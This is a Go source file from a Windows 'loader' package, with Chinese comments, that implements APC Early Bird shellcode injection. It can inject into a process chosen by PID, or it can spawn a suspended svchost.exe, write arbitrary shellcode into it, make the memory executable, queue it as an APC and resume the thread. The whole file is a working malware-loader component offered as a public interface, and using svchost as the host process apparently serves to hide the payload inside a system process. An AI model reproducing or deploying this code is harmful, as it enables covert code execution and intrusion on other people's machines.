//go:build windows && amd64

package loader

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// injectViaAPCEarlyBird 使用 APC Early Bird 技术执行 shellcode。
// 流程：
//  1. CreateProcess with CREATE_SUSPENDED（挂起的子进程）
//  2. VirtualAllocEx(RW) → WriteProcessMemory → VirtualProtectEx(RW→RX)
//  3. QueueUserAPC 向主线程排队 APC（指向 shellcode）
//  4. ResumeThread — 线程进入 alertable 状态时 APC 立即执行
//
// 与标准 APC 的区别：Early Bird 使用 CREATE_SUSPENDED + QueueUserAPC + ResumeThread，
// shellcode 在线程正常执行前就被调用，避免进程初始化代码的干扰。
func injectViaAPCEarlyBird(cfg *LoadConfig) *LoadResult {
	if len(cfg.Shellcode) == 0 {
		return &LoadResult{
			Success: false,
			Message: "empty shellcode",
		}
	}

	// 使用默认目标进程
	target := cfg.PID
	if target <= 0 {
		// 如果没有指定 PID，创建新进程
		return injectViaAPCEarlyBirdSpawn(cfg)
	}

	// 已有目标 PID，直接在其上注入
	return injectViaAPCTarget(cfg, uint32(target))
}

// injectViaAPCTarget 对已有进程进行 APC 注入。
func injectViaAPCTarget(cfg *LoadConfig, pid uint32) *LoadResult {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procOpenProcess := kernel32.NewProc("OpenProcess")
	procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	procCreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	procThread32First := kernel32.NewProc("Thread32First")
	procThread32Next := kernel32.NewProc("Thread32Next")
	procOpenThread := kernel32.NewProc("OpenThread")
	procQueueUserAPC := kernel32.NewProc("QueueUserAPC")
	procVirtualFreeEx := kernel32.NewProc("VirtualFreeEx")

	const (
		PROCESS_ALL_ACCESS   = 0x001F0FFF
		THREAD_ALL_ACCESS    = 0x001F03FF
		MEM_COMMIT           = 0x1000
		MEM_RESERVE          = 0x2000
		MEM_RELEASE          = 0x8000
		PAGE_READWRITE       = 0x04
		PAGE_EXECUTE_READ    = 0x20
		TH32CS_SNAPTHREAD    = 0x00000004
	)

	type THREADENTRY32 struct {
		Size           uint32
		CntUsage       uint32
		ThreadID       uint32
		OwnerProcessID uint32
		BasePri        int32
		DeltaPri       int32
		Flags          uint32
	}

	// 1. 打开目标进程
	ret, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if ret == 0 {
		return &LoadResult{Success: false, Message: fmt.Sprintf("OpenProcess(%d) failed", pid)}
	}
	hProcess := syscall.Handle(ret)
	defer syscall.CloseHandle(hProcess)

	// 2. 分配 RW 内存
	shellcodeLen := len(cfg.Shellcode)
	ret, _, _ = procVirtualAllocEx.Call(
		uintptr(hProcess), 0, uintptr(shellcodeLen),
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	)
	if ret == 0 {
		return &LoadResult{Success: false, Message: "VirtualAllocEx failed"}
	}
	remoteAddr := ret

	// 3. 写入 shellcode
	var written uintptr
	ret, _, _ = procWriteProcessMemory.Call(
		uintptr(hProcess), remoteAddr,
		uintptr(unsafe.Pointer(&cfg.Shellcode[0])),
		uintptr(shellcodeLen),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		procVirtualFreeEx.Call(uintptr(hProcess), remoteAddr, 0, MEM_RELEASE)
		return &LoadResult{Success: false, Message: "WriteProcessMemory failed"}
	}

	// 4. RW → RX
	var oldProtect uintptr
	ret, _, _ = procVirtualProtectEx.Call(
		uintptr(hProcess), remoteAddr, uintptr(shellcodeLen),
		PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		procVirtualFreeEx.Call(uintptr(hProcess), remoteAddr, 0, MEM_RELEASE)
		return &LoadResult{Success: false, Message: "VirtualProtectEx failed"}
	}

	// 5. 枚举线程
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snapshot == uintptr(syscall.InvalidHandle) {
		return &LoadResult{Success: false, Message: "CreateToolhelp32Snapshot failed"}
	}
	defer syscall.CloseHandle(syscall.Handle(snapshot))

	var entry THREADENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	applied := false
	ret, _, _ = procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret != 0 {
		for {
			if entry.OwnerProcessID == pid {
				// 6. 向线程 Queue APC
				tRet, _, _ := procOpenThread.Call(THREAD_ALL_ACCESS, 0, uintptr(entry.ThreadID))
				if tRet != 0 {
					hThread := syscall.Handle(tRet)
					aRet, _, _ := procQueueUserAPC.Call(remoteAddr, uintptr(hThread), 0)
					syscall.CloseHandle(hThread)
					if aRet != 0 {
						applied = true
						break
					}
				}
			}
			ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
			if ret == 0 {
				break
			}
		}
	}

	if !applied {
		return &LoadResult{Success: false, Message: "QueueUserAPC failed for all threads"}
	}

	return &LoadResult{
		Success: true,
		Message: "shellcode injected successfully via APC Early Bird",
	}
}

// injectViaAPCEarlyBirdSpawn 创建挂起进程并注入 shellcode（经典 APC Early Bird）。
func injectViaAPCEarlyBirdSpawn(cfg *LoadConfig) *LoadResult {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procCreateProcess := kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	procQueueUserAPC := kernel32.NewProc("QueueUserAPC")
	procResumeThread := kernel32.NewProc("ResumeThread")
	procVirtualFreeEx := kernel32.NewProc("VirtualFreeEx")

	const (
		PROCESS_ALL_ACCESS = 0x001F0FFF
		THREAD_ALL_ACCESS  = 0x001F03FF
		MEM_COMMIT         = 0x1000
		MEM_RESERVE        = 0x2000
		MEM_RELEASE        = 0x8000
		PAGE_READWRITE     = 0x04
		PAGE_EXECUTE_READ  = 0x20
		CREATE_SUSPENDED   = 0x00000004
		CREATE_UNICODE_ENV = 0x00000400
	)

	type STARTUPINFOW struct {
		Cb            uint32
		_             *uint16
		Desktop       *uint16
		Title         *uint16
		X             uint32
		Y             uint32
		XSize         uint32
		YSize         uint32
		XCountChars   uint32
		YCountChars   uint32
		FillAttribute uint32
		Flags         uint32
		ShowWindow    uint16
		_             *uint16
		StdInput      syscall.Handle
		StdOutput     syscall.Handle
		StdError      syscall.Handle
	}

	type PROCESS_INFORMATION struct {
		Process    syscall.Handle
		Thread     syscall.Handle
		ProcessID  uint32
		ThreadID   uint32
	}

	// 目标进程路径
	processPath := `C:\Windows\System32\svchost.exe`
	cmdLine := syscall.StringToUTF16Ptr(`"C:\Windows\System32\svchost.exe" -k netsvcs`)

	var si STARTUPINFOW
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi PROCESS_INFORMATION

	// 1. 创建挂起进程
	ret, _, _ := procCreateProcess.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(processPath))),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0,
		0,
		CREATE_SUSPENDED|CREATE_UNICODE_ENV,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return &LoadResult{Success: false, Message: "CreateProcess failed"}
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	// 2. 分配 RW 内存
	shellcodeLen := len(cfg.Shellcode)
	ret, _, _ = procVirtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(shellcodeLen),
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	)
	if ret == 0 {
		syscall.TerminateProcess(pi.Process, 0)
		return &LoadResult{Success: false, Message: "VirtualAllocEx failed"}
	}
	remoteAddr := ret

	// 3. 写入 shellcode
	var written uintptr
	ret, _, _ = procWriteProcessMemory.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&cfg.Shellcode[0])),
		uintptr(shellcodeLen),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		procVirtualFreeEx.Call(uintptr(pi.Process), remoteAddr, 0, MEM_RELEASE)
		syscall.TerminateProcess(pi.Process, 0)
		return &LoadResult{Success: false, Message: "WriteProcessMemory failed"}
	}

	// 4. RW → RX
	var oldProtect uintptr
	ret, _, _ = procVirtualProtectEx.Call(
		uintptr(pi.Process), remoteAddr, uintptr(shellcodeLen),
		PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		procVirtualFreeEx.Call(uintptr(pi.Process), remoteAddr, 0, MEM_RELEASE)
		syscall.TerminateProcess(pi.Process, 0)
		return &LoadResult{Success: false, Message: "VirtualProtectEx failed"}
	}

	// 5. QueueUserAPC 到主线程
	ret, _, _ = procQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
	if ret == 0 {
		procVirtualFreeEx.Call(uintptr(pi.Process), remoteAddr, 0, MEM_RELEASE)
		syscall.TerminateProcess(pi.Process, 0)
		return &LoadResult{Success: false, Message: "QueueUserAPC failed"}
	}

	// 6. 恢复线程 — shellcode 执行
	_, _, _ = procResumeThread.Call(uintptr(pi.Thread))

	return &LoadResult{
		Success: true,
		Message: fmt.Sprintf("shellcode injected via APC Early Bird (pid=%d)", pi.ProcessID),
	}
}

// InjectViaAPCEarlyBird 公开接口。
func InjectViaAPCEarlyBird(cfg *LoadConfig) *LoadResult {
	return injectViaAPCEarlyBird(cfg)
}
